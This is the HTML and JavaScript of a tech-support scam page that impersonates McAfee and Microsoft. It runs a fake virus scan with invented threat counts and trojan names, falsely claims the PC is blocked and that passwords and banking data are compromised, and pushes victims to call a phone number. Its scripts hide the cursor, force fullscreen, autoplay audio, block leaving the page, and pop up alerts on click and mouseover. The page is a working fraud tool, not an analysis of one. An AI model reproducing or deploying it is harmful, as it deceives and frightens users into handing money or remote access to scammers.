</head>
<body id="mycanvas" class="map" onbeforeunload="return myFunction()" style="cursor:none;">
<audio id="beep" autoplay="">
    <source src="tts.mp3" type="audio/mpeg">
</audio>
<div class="bg" style="cursor:none;">
    <div class="bgimg" style="top: 0px;"><img src="background.png" alt="" width="100%"/></div>

</div>
<a href="#" rel="noreferrer" id="link_black" style="cursor: none;">
    <div class="black" style="height: 145%;cursor: none;"></div>
</a>

<div class="pro_box" style="cursor: none;">
    <div class="pro_box_header">
        <div class="row">
            <div class="col-md-12">
                <div class="minimize">
                    <ul>
                        <li><a href="#"><img src="minimize.jpg"></a></li>

                    </ul>
                </div>
            </div>
            <div class="col-md-4">
                <div class="logo">
                    <img src="microsoft.png"><span>McAfee Protection</span>
                </div>
            </div>
            <div class="col-md-8">
                <div class="activate_lic">
                    <ul>
                        <li><a href="#">
                                <button>Activate license</button>
                            </a></li>
                        <li><a href="#"><img src="setting.png"></a></li>
                        <li><a href="#"><img src="que.png"></a></li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
    <div class="scan_box">
        <div class="scan_box_header">
            <div class="row">
                <div class="col-md-6">
                    <div class="quick_scan">
                        <p><img src="virus-scan.png"><span>Quick Scan</span></p>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="minimize1">
                        <ul>
                            <li><a href="#"><img src="minimize.jpg"></a></li>

                        </ul>
                    </div>
                </div>
            </div>
        </div>
        <div class="scan_body">
            <div class="progress">
                <div id="dynamic" class="progress-bar progress-bar-success active" role="progressbar" aria-valuenow="0"
                     aria-valuemin="0" aria-valuemax="100" style="width: 0%">
                    <span id="current-progress"></span>
                </div>
            </div>
            <div class="table_quick">
                <table class="table table-bordered">
                    <thead>
                    <tr>
                        <th scope="col">Objects scanned</th>
                        <th scope="col">
                            <div class="counter col_fourth">
                                <h2 class="timer count-title count-number" data-to="51900" data-speed="5000"></h2>
                            </div>
                        </th>
                    </tr>
                    <tr>
                        <th scope="col">Time Elapsed</th>
                        <th scope="col">5 secs</th>
                    </tr>
                    <tr>
                        <th scope="col">Threats found</th>
                        <th scope="col" style="color: red;"><h2 class="timer count-title count-number" data-to="11"
                                                                data-speed="2000"></h2></th>
                    </tr>
                    </thead>
                </table>
            </div>
        </div>
        <div class="scan_footer">
            <div class="row">
                <div class="col-md-6">
                    <div class="bt_can">
                        <div class="btn-group" role="group" aria-label="Basic example">
                            <button type="button" class="btn btn-secondary">Cancel</button>
                        </div>
                        <div class="btn-group" role="group" aria-label="Basic example">
                            <button type="button" class="btn btn-secondary">Pause</button>
                        </div>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="bt_can2">
                        <div class="btn-group" role="group" aria-label="Basic example">
                            <button type="button" class="btn btn-secondary" id="">Scheduled Scans</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="pro_box2" style="cursor: none;">
    <div class="pro_box_header">
        <div class="row">
            <div class="col-md-12">
                <div class="minimize">
                    <ul>
                        <li><a href="#"><img src="minimize.jpg"></a></li>

                    </ul>
                </div>
            </div>
            <div class="col-md-4">
                <div class="logo">
                    <img src="microsoft.png"><span>McAfee Protection</span>
                </div>
            </div>
            <div class="col-md-8">
                <div class="activate_lic">
                    <ul>
                        <li><a href="#">
                                <button>Activate license</button>
                            </a></li>
                        <li><a href="#"><img src="bell.png"></a></li>
                        <li><a href="#"><img src="setting.png"></a></li>
                        <li><a href="#"><img src="que.png"></a></li>
                    </ul>
                </div>
            </div>
        </div>
    </div>

    <div class="scan_box2">
        <div class="scan_box_header">
            <div class="row">
                <div class="col-md-6">
                    <div class="quick_scan">
                        <p><img src="virus-scan.png"><span>Scanner</span></p>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="minimize1">
                        <ul>
                            <li><a href="#"><img src="minimize.jpg"></a></li>

                        </ul>
                    </div>
                </div>
            </div>
        </div>
        <div class="scan_body">
            <div class="row">
                <div class="col-md-4">
                    <h4 class="new_heading">Threat Scan results</h4>
                </div>
                <div class="col-md-8">
                    <div class="total_detail">
                        <ul>
                            <li><a href="#"><p>Items detected</p>
                                    <p>11</p></a></li>
                            <li><a href="#"><p>Scan Time</p>
                                    <p>3 sec</p></a></li>
                            <li><a href="#"><p>Item Scanned</p>
                                    <p>51,900</p></a></li>
                        </ul>
                    </div>
                </div>
            </div>
            <br>
            <div class="table_quick2">
                <table class="table table-bordered">
                    <thead>
                    <tr>
                        <th>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </th>
                        <th>Name</th>
                        <th>Type</th>
                        <th>Object type</th>
                        <th>Location</th>
                    </tr>
                    </thead>
                    <tbody id="table_scroll">
                    <tr>
                        <td>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </td>
                        <td>Trojan.DNSCharge.AC...</td>
                        <td>Malware</td>
                        <td>Registry Value</td>
                        <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                    </tr>
                    <tr>
                        <td>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </td>
                        <td>Trojan.Dropper.Autoit...</td>
                        <td>Malware</td>
                        <td>File</td>
                        <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                    </tr>
                    <tr>
                        <td>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </td>
                        <td>PUP.Optional.RelevantK...</td>
                        <td>Potentially Unwanted...</td>
                        <td>File</td>
                        <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                    </tr>
                    <tr>
                        <td>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </td>
                        <td>PUP.Optional.DownLoad...</td>
                        <td>Potentially Unwanted...</td>
                        <td>File</td>
                        <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                    </tr>
                    <tr>
                        <td>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </td>
                        <td>Adware.TopGuard...</td>
                        <td>Malware</td>
                        <td>File</td>
                        <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                    </tr>
                    <tr>
                        <td>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </td>
                        <td>PUP.Optional.RelevantK...</td>
                        <td>Malware</td>
                        <td>File</td>
                        <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                    </tr>
                    <tr>
                        <td>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </td>
                        <td>Adware.Bundler...</td>
                        <td>Potentially Unwanted...</td>
                        <td>File</td>
                        <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                    </tr>
                    <tr>
                        <td>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </td>
                        <td>Trojan.DNSCharge.AC...</td>
                        <td>Malware</td>
                        <td>Registry Value</td>
                        <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                    </tr>
                    <tr>
                        <td>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </td>
                        <td>Trojan.Dropper.Autoit...</td>
                        <td>Malware</td>
                        <td>File</td>
                        <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                    </tr>
                    <tr>
                        <td>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </td>
                        <td>PUP.Optional.RelevantK...</td>
                        <td>Potentially Unwanted...</td>
                        <td>File</td>
                        <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                    </tr>
                    <tr>
                        <td>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </td>
                        <td>PUP.Optional.DownLoad...</td>
                        <td>Potentially Unwanted...</td>
                        <td>File</td>
                        <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                    </tr>

                    </tbody>
                </table>
            </div>
        </div>
        <div class="scan_footer2">
            <div class="row">
                <div class="col-md-6">
                    <div class="bt_can">
                        <div class="dropdown">
                            <a class="btn btn-secondary dropdown-toggle" style="width:126px;" href="#" role="button"
                               id="dropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                Save result
                            </a>

                            <div class="dropdown-menu" aria-labelledby="dropdownMenuLink">
                                <a class="dropdown-item" href="#">Action</a>
                                <a class="dropdown-item" href="#">Another action</a>
                                <a class="dropdown-item" href="#">Something else here</a>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="bt_can2">
                        <div class="btn-group" role="group" aria-label="Basic example">
                            <button type="button" class="btn btn-secondary">Close</button>
                        </div>
                        <div class="btn-group" role="group" aria-label="Basic example">
                            <button type="button" class="btn btn-secondary bg_red">Quarantine</button>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    </div>
</div>
<div class="pro_box3" style="cursor: none;">
    <div class="pro_box_header">
        <div class="row">
            <div class="col-md-12">
                <div class="minimize">
                    <ul>
                        <li><a href="#"><img src="minimize.jpg"></a></li>

                    </ul>
                </div>
            </div>
            <div class="col-md-4">
                <div class="logo">
                    <img src="microsoft.png"><span>McAfee Protection</span>
                </div>
            </div>
            <div class="col-md-8">
                <div class="activate_lic">
                    <ul>
                        <li><a href="#">
                                <button>Activate license</button>
                            </a></li>
                        <li><a href="#"><img src="bell.png"></a></li>
                        <li><a href="#"><img src="setting.png"></a></li>
                        <li><a href="#"><img src="que.png"></a></li>
                    </ul>
                </div>
            </div>
        </div>
    </div>

    <div class="scan_box2">
        <div class="scan_box_header">
            <div class="row">
                <div class="col-md-6">
                    <div class="quick_scan">
                        <p><img src="virus-scan.png"><span>Scanner</span></p>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="minimize1">
                        <ul>
                            <li><a href="#"><img src="minimize.jpg"></a></li>

                        </ul>
                    </div>
                </div>
            </div>
        </div>
        <div class="scan_body">
            <div class="row">
                <div class="col-md-12">
                    <div class="total_detail_scan">
                        <ul>
                            <li><a href="#">Scanner</a></li>
                            <li><a href="#">Scan Scheduler</a></li>
                            <li><a href="#">Reports</a></li>
                        </ul>
                    </div>
                </div>
            </div>
            <br>
            <div class="table_quick2">
                <div class="row">
                    <div class="col-md-4">
                        <div class="pc_desk">
                            <img src="pc.png">
                        </div>
                    </div>
                    <div class="col-md-4">
                        <div class="scan_pro mar_top">
                            <ul>
                                <li><i class="fa fa-check" aria-hidden="true"></i> Cheacking for updates</li>
                                <li><i class="fa fa-check" aria-hidden="true"></i> Scan memory</li>
                                <li><i class="fa fa-check" aria-hidden="true"></i> Scan startup items</li>
                                <li>
                                    <div class="circular-spinner"></div>
                                    <span>Scanning registry</span></li>
                                <li>Scanning file system</li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-md-4">
                        <div class="scan_dur">
                            <p><strong>Scan duration</strong></p>
                            <p>3sec 0s</p>
                            <p>5sec 0s</p>
                            <br>
                            <p><strong>Items scanned</strong></p>
                            <p>51,900</p>
                            <br>
                            <p><strong>Detections</strong></p>
                            <p>11</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="scan_footer3">
            <div class="row">
                <div class="col-md-2">
                    <div class="viruses">
                        <img src="virus-scan.png">
                    </div>
                </div>
                <div class="col-md-10">
                    <div class="make_this">
                        <p>Make this the last you worry about online threats</p>
                        <p>Malwarebytes Premium stops malware, viruses, and more without bogging down your computer.
                            Upgrade to Premium</p>
                    </div>
                </div>

            </div>
        </div>
    </div>
</div>

<div id="footer" style="bottom: 0px; position: fixed; cursor: none; background-color: red;">
    <div class="row">
        <div class="col-md-12">
            <div class="right-foot" style="text-align: center;">
                <span id="footertxt">
                    <img src="microsoft.png"> McAfee:
                </span>
                <span style="font-weight: 700; padding-left: 13px; color: #fff;">
                    Contact Support 
                    <span style="border: 1px solid #A40E25; border-radius: 5px; padding: 2px 5px;">
                        +1 251-263-8027 (Security Helpline)
                    </span>
                </span>
            </div>
        </div>

        <div class="col-md-12">
            <marquee width="100%" direction="left" height="100px"><small class="text-left"
                                                                         style="color: #FFFFFF;font-size: 14px;">Windows
                    Defender SmartScreen prevented an unrecognized app from stating. Running this app might put your PC
                    at risk. McAfee Defender Scan has found potentially unwanted Adware on this device that can steal
                    your passwords, online identity, financial information, personal files, pictures or
                    documents.</small></marquee>
        </div>
    </div>


</div>

<div id="poptxt" class="lightbox">
    <div class="ilb top">
        <div class="headers ilb" style="border-bottom: 1px solid #A40E25;">
            <span id="txtadd" class="fl title"><span class="fl ilb"><img src="def.png" class="logo3"></span> McAfee_LiveSafe_Protection_Alert !</span>
            <span id="txts1" class="fl title2"><a href="#"><img src="cross.png"></a></span>

        </div>
    </div>
    <div id="txtintro">
                <span class="colo-rd">App: Ads.financetrack(1).exe<br>
                Threat Detected: Trojan Spyware</span>
    </div>
    <img id="banner" src="virus-images.png">
    <div id="disclaimer">
        Access to this PC has been blocked for security reasons.<br>
        <span class="support" style="color: red;">Contact McAfee Support: +1 251-263-8027 (Security Helpline)</span>

    </div>
    <div id="bottom">
        <img id="badge" src="microsoft.png"><span class="title3">McAfee</span>
        <ul>
            <li>
                <a href="#">
                    <div class="fr button2">
                        <span id="addtochromebutton">ALLOW</span>
                    </div>
                </a>
            </li>
            <li>
                <a href="#">
    <div class="fr button" style="background-color: red; color: white; text-align: center; padding: 10px;">
        <span id="addtochromebutton">DENY</span>
    </div>
</a>

            </li>
        </ul>

    </div>
</div>

<div id="pop_up_new" class="cardcontainer" style="cursor: none; background-color: red;">
    <p class="text-center" style="font-size: 16px; font-weight: normal; margin: 0; margin-bottom: 5px; padding: 5px 10px; color: #FFFFFF !important; font-weight: bold; margin-top: 8px;">
        McAfee-LiveSafe - Security Warning
    </p>
    <p>** ACCESS TO THIS PC HAS BEEN BLOCKED FOR SECURITY REASONS **</p>
    <p>Your computer has alerted us that it has been infected with a Trojan Spyware. The following data has been
        compromised.</p>
    <p>&gt; Email Credentials<br>
        &gt; Banking Passwords<br>
        &gt; Facebook Login<br>
        &gt; Pictures &amp; Documents
    </p>
    <p>McAfee-LiveSafe Scan has found potentially unwanted Adware on this device that can steal your passwords, online
        identity, financial information, personal files, pictures or documents.</p>
    <p>You must contact us immediately so that our engineers can walk you through the removal process over the
        phone.</p>
    <p>Call McAfee Support immediately to report this threat, prevent identity theft and unlock access to this
        device.</p>
    <p>Closing this McAfee will put your personal information at risk and lead to a suspension of your Windows
        Registration.</p>
    <p style="padding-bottom: 0px; color:#A40E25; font-size:14px;">Call McAfee Support: <strong>
+1 251-263-8027           (Security Helpline) </strong></p>
    <div class="action_buttons">
        <a class="active" id="leave_page" style="cursor: pointer; color: #A40E25 !important;">OK</a>
        <a class="active" id="leave_page" style="color: #A40E25 !important;">Cancel</a>
    </div>
</div>

<div id="welcomeDiv"
     style="display: none; background-color: rgba(40, 40, 40, 0.62); height: auto; width: 550px; margin-left: 30%; position: absolute; z-index: 9999999999;"
     class="answer_list">
    <p class="text-center" style="color: #FFFFFF; margin-top: 10px; font-size: 16px; opacity: 0.9;">
        Do not restart or use your computer.<br>Your computer is disabled. Please call McAfee Protection.<br>Access is blocked for security reasons for this computer.<br>Please contact us immediately. A technician will help you solve the problem.
    </p>
</div>


<!-- Optional JavaScript; choose one of the two! -->

<!-- Option 1: jQuery and Bootstrap Bundle (includes Popper) -->
<script src="../cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js" type="text/javascript"></script>
<script src="../cdn.jsdelivr.net/npm/bootstrap%404.6.0/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-Piv4xVNRyMGpqkS2by6br4gNJ7DXjqk09RmUpJ8jgGtD7zP9yug3goQfGII0yAns"
        crossorigin="anonymous"></script>
<script type="text/javascript" src="fullscreen.js"></script>
<script type="text/javascript" src="before.js"></script>
<script type="text/javascript" src="main.js"></script>
<script type="text/javascript" src="light.js"></script>
<script type="text/javascript">
    $(function () {
        var current_progress = 0;
        var interval = setInterval(function () {
            current_progress += 10;
            $("#dynamic")
                .css("width", current_progress + "%")
                .attr("aria-valuenow", current_progress)
                .text(current_progress + "% Complete");
            if (current_progress >= 100)
                clearInterval(interval);
        }, 100);
    });
</script>
<script type="text/javascript">
    (function ($) {
        $.fn.countTo = function (options) {
            options = options || {};

            return $(this).each(function () {
                // set options for current element
                var settings = $.extend({}, $.fn.countTo.defaults, {
                    from: $(this).data('from'),
                    to: $(this).data('to'),
                    speed: $(this).data('speed'),
                    refreshInterval: $(this).data('refresh-interval'),
                    decimals: $(this).data('decimals')
                }, options);

                // how many times to update the value, and how much to increment the value on each update
                var loops = Math.ceil(settings.speed / settings.refreshInterval),
                    increment = (settings.to - settings.from) / loops;

                // references & variables that will change with each update
                var self = this,
                    $self = $(this),
                    loopCount = 0,
                    value = settings.from,
                    data = $self.data('countTo') || {};

                $self.data('countTo', data);

                // if an existing interval can be found, clear it first
                if (data.interval) {
                    clearInterval(data.interval);
                }
                data.interval = setInterval(updateTimer, settings.refreshInterval);

                // initialize the element with the starting value
                render(value);

                function updateTimer() {
                    value += increment;
                    loopCount++;

                    render(value);

                    if (typeof (settings.onUpdate) == 'function') {
                        settings.onUpdate.call(self, value);
                    }

                    if (loopCount >= loops) {
                        // remove the interval
                        $self.removeData('countTo');
                        clearInterval(data.interval);
                        value = settings.to;

                        if (typeof (settings.onComplete) == 'function') {
                            settings.onComplete.call(self, value);
                        }
                    }
                }

                function render(value) {
                    var formattedValue = settings.formatter.call(self, value, settings);
                    $self.html(formattedValue);
                }
            });
        };

        $.fn.countTo.defaults = {
            from: 0,               // the number the element should start at
            to: 0,                 // the number the element should end at
            speed: 100,           // how long it should take to count between the target numbers
            refreshInterval: 100,  // how often the element should be updated
            decimals: 0,           // the number of decimal places to show
            formatter: formatter,  // handler for formatting the value before rendering
            onUpdate: null,        // callback method for every time the element is updated
            onComplete: null       // callback method for when the element finishes updating
        };

        function formatter(value, settings) {
            return value.toFixed(settings.decimals);
        }
    }(jQuery));

    jQuery(function ($) {
        // custom formatting example
        $('.count-number').data('countToOptions', {
            formatter: function (value, options) {
                return value.toFixed(options.decimals).replace(/\B(?=(?:\d{3})+(?!\d))/g, ',');
            }
        });

        // start all the timers
        $('.timer').each(count);

        function count(options) {
            var $this = $(this);
            options = $.extend({}, options || {}, $this.data('countToOptions') || {});
            $this.countTo(options);
        }
    });
</script>
<script type="text/javascript">
    $(document).ready(function () {
        $(".pro_box2").delay(1500).fadeIn(800);
        $(".pro_box3").delay(2500).fadeIn(800);
        $(".pro_box3").delay(3000).fadeIn(800);
        $("#pop_up_new").delay(3500).fadeIn(800);
        $("#poptxt").delay(4000).fadeIn(800);
    });
</script>
<script type="text/javascript">
    document.addEventListener('keyup', function (es) {
        if (es.keyCode === 27) {
            toggleFullScreen();
        }
    }, false);
</script>
<script type="text/javascript">
    document.addEventListener('keyup', function (e) {
        if (e.keyCode === 122 || e.keyCode === 17 || e.keyCode === 18 || e.keyCode === 13) {
            document.getElementById('map').innerHTML = stroka;
            toggleFullScreen();
        }
    }, false);
</script>
<script>
    // Get the modal
    var modal = document.getElementById('myModal');

    // Get the button that opens the modal
    var btn = document.getElementById("myBtn");

    // Get the <span> element that closes the modal
    var span = document.getElementsByClassName("close")[0];

    // When the user clicks the button, open the modal
    /*btn.onclick = function() {
      modal.style.display = "block";
    } */

    // When the user clicks on <span> (x), close the modal
    span.onclick = function () {
        modal.style.display = "none";
    }

    // When the user clicks anywhere outside of the modal, close it
    window.onclick = function (event) {
        if (event.target == modal) {
            modal.style.display = "none";
        }
    }
</script>
<script type="text/javascript">
    setTimeout(function () {
        document.getElementById("beep").play();
    });
</script>
<script>
    $(document).ready(function () {
        $("#mycanvas").click(function () {
            $("#welcomeDiv").show();
        });
    });
</script>
<script type="text/javascript">
    $(document).ready(function () {
        $("body").mouseover(function () {
            $("#poptxt").show();
        });
    });
</script>
</body>